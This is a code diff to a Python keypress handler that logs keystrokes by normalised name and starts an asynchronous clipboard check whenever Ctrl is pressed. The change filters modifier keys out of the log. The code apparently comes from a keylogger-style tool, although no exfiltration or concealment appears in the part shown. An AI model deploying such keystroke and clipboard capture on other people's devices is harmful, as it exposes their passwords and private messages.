@@ -726,21 +726,14 @@ def on_press(key):
 
         if key_str in ("Key.ctrl_l", "Key.ctrl_r", "Key.ctrl"):
             Thread(target=check_clipboard_async, daemon=True).start()
+            return
+
+        # Ignore non-printable modifier keys to prevent log noise (e.g. 'ctrl', 'trl', 'left_shift')
+        if key_str in ("Key.esc", "Key.caps_lock", "Key.shift", "Key.shift_l", "Key.shift_r", "Key.alt", "Key.alt_l", "Key.alt_r", "Key.alt_gr", "Key.cmd", "Key.cmd_l", "Key.cmd_r"):
+            return
         
         # Map key strings to the normalized clean names
-        if key_str == "Key.esc":
-            key_str = "esc"
-        elif key_str == "Key.caps_lock":
-            key_str = "caps_lock"
-        elif key_str in ("Key.shift", "Key.shift_l"):
-            key_str = "left_shift"
-        elif key_str == "Key.shift_r":
-            key_str = "right_shift"
-        elif key_str == "Key.alt_l":
-            key_str = "left_alt"
-        elif key_str in ("Key.alt_r", "Key.alt_gr"):
-            key_str = "right_alt"
-        elif key_str == "Key.enter":
+        if key_str == "Key.enter":
             key_str = "enter"
         elif key_str == "Key.space":
             key_str = "space"
@@ -748,14 +741,10 @@ def on_press(key):
             key_str = " [tab] "
         elif key_str == "Key.backspace":
             key_str = "[⌫]"
-        elif key_str in ("Key.cmd", "Key.cmd_l", "Key.cmd_r"):
-            key_str = "left_windows"
         elif key_str == "Key.end":
             key_str = "end"
         elif key_str == "Key.delete":
             key_str = "delete"
-        elif key_str in ("Key.ctrl", "Key.ctrl_l", "Key.ctrl_r"):
-            key_str = "ctrl"
         elif key_str == "Key.print_screen":
             key_str = "print_screen"
         elif key_str in ("\x03", "\\x03", "\x16", "\\x16", "\x1a", "\\x1a", "\x01", "\\x01", "\x18", "\\x18"):
